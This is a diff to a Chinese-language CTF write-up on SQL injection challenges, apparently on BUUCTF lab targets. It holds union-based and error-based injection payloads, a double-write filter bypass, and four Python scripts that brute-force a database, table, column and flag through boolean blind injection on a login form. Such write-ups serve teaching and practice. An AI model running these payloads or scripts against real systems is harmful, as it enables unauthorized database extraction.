@@ -54,6 +54,108 @@ scrabble http://example.com/
 
 可以看出是字符形式的注入。执行 =select * from notes where id ='-1' union select 1,2, group_concat(table_name) from information_schema.tables where table_schema=database()#'= 获取表名，查到有个表 =fl4g= 。要注意select出来的个数必须为3，直接 =select *= 查不到东西。应该是后台过滤了参数必须为3个，并且只有后面两个会显示，所以查出来的 =table_name= 也要用 =group_concat= 合并为一个字段。拿到表名后执行 =select * from notes where id ='4' union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'fl4g' #'= 获取到列名为fllllag。最后执行 =select * from notes where id = '4' union select 1,2,fllllag from fl4g= 就能获取flag。
 ** SQL注入-2
-看源码发现提示，参数加入 =&tips=1= 的时候会返回报错信息，是报错注入，如果不加提示就是基于时间的盲注。先来看用提示的。
+看源码发现提示，参数加入 =&tips=1= 的时候会返回报错信息，是报错注入，如果不加提示就是布尔盲注。先来看用提示的。
 
 随便输入用户名会提示账号不存在，用户名输admin提示账号或密码错误。注入点在用户名。执行 =name=admin' and (select extractvalue(1,concat(0x7e,(database()))))--+&pass=123= 拿到库名 =note= ， =name=admin' and extractvalue(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema = 'note'))--+&pass=123= 拿表名。看错误提示猜测 =select= 被过滤了，用双写 =selselectect= 替换 =select= 拿到表名 =fl4g= 。 =name=admin' and (selselectect extractvalue(1,concat(0x7e,(seleselectct group_concat(column_name) from information_schema.columns where table_name = 'fl4g'))))--+&pass=123= 拿到列名 =flag= ， =name=admin' and(select extractvalue(1,concat(0x7e,(selselectect group_concat(flag) from fl4g))))--+&pass=123= 拿到flag。
+
+盲注参考了[[https://www.cnblogs.com/xiaochaofang/p/14873459.html][这篇博客]]。在用户名字段拼接上语句，若后面的语句成功执行，会提示“用户名或密码错误”，否则会提示“找不到用户”。这其实是布尔盲注，能够获得的信息只有真假值。要是连布尔返回值也没有，就只能用时间盲注了，也就是在语句最后连上 =or sleep(1)= ，根据返回时间判断是否执行，从而转换为布尔盲注。
+
+先测试库名长度 =name=1' or length(database())=4#&pass=asdasd= ，数字为4的时候返回“用户名或密码错误”，确定库名长度为4。随后用 =name=1' or substr(database(),1,1) ='n'#&pass=asdasd= 一个一个字符测试库名。之后和前面的注入一样，找表名和列名，输出flag。用下面脚本爆破得到库名
+#+begin_src python
+import requests
+import time
+
+l = 'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'          #可能的字符
+url = 'http://dc879727-d344-4402-aee0-5d997fcf4208.node3.buuoj.cn/login.php'
+sql = "1' or substr(database(),%d,1)='%s'#"             #构造的注入语句
+flag = ''
+for num in range(1,5):           #根据库名长度进行循环
+    for i in l:
+        data = {                #构造字典数据
+            'name' : sql %(num,i),          #把循环变量放入的sql语句中构造完整变化的sql语句
+            'pass' : 'asdasd'
+        }
+        r = requests.post(url = url , data=data)        #对url提交post请求，data为用户名密码数据
+        time.sleep(0.2)         #等待时间
+        if r"\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef" in r.text:     #根据回显确定库名
+            flag += i
+            print("flag:" , flag)
+            break
+print("flag:", flag)
+#+end_src
+
+爆表名
+
+#+begin_Src python
+import requests
+import time
+l = 'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'          #可能的字符
+url = 'http://1b1372ff-b5cb-4f72-98c5-bc9d1f4d321d.node3.buuoj.cn/login.php'
+#sql = "1' or substr(database(),%d,1)='%s'#"             #构造的注入语句
+sql = "1' or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s'#"
+flag = ''
+for num in range(1,10):           #根据库名长度进行循环（因为不确定表名长度，我试着写长度稍微大点）
+    for i in l:
+        data = {                #构造字典数据
+            'name' : sql %(num,i),          #把循环变量放入的sql语句中构造完整变化的sql语句
+            'pass' : 'asdasd'
+        }
+        r = requests.post(url = url , data=data)        #对url提交post请求，data为用户名密码数据
+        time.sleep(0.2)         #等待时间
+        if r"\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef" in r.text:     #根据回显确定库名
+            flag += i
+            print("flag:" , flag)
+            break
+print("flag:", flag)
+#+end_src
+字段名
+#+begin_Src python
+import requests
+import time
+
+l = 'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'
+url = 'http://8454f388-49f3-4980-962b-7b7781dce053.node3.buuoj.cn/login.php'
+#sql = "1' or substr(database(),%d,1)='%s'#"
+#sql = "1' or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s'#"
+sql = "1' or substr((seLEct group_concat(column_name) from information_schema.columns where table_name='fl4g'),%d,1)='%s'#"
+flag = ''
+for num in range(1,13):
+    for i in l:
+        data = {
+            'name' : sql %(num,i),
+            'pass' : 'asdasd'
+        }
+        r = requests.post(url = url , data=data)
+        time.sleep(0.2)
+        if r"\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef" in r.text:
+            flag += i
+            print("flag:" , flag)
+            break
+print("flag:", flag)
+#+end_src
+flag
+#+begin_Src python
+import requests
+import time
+
+l = 'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'
+url = 'http://8454f388-49f3-4980-962b-7b7781dce053.node3.buuoj.cn/login.php'
+#sql = "1' or substr(database(),%d,1)='%s'#"
+#sql = "1' or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s'#"
+#sql = "1' or substr((seLEct group_concat(column_name) from information_schema.columns where table_name='fl4g'),%d,1)='%s'#"
+sql = "1' or substr((seLEct flag from fl4g),%d,1)='%s'#&pass=asdasd"
+flag = ''
+for num in range(1,30):
+    for i in l:
+        data = {
+            'name' : sql %(num,i),
+            'pass' : 'asdasd'
+        }
+        r = requests.post(url = url , data=data)
+        time.sleep(0.2)
+        if r"\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef" in r.text:
+            flag += i
+            print("flag:" , flag)
+            break
+print("flag:", flag)
+#+end_src
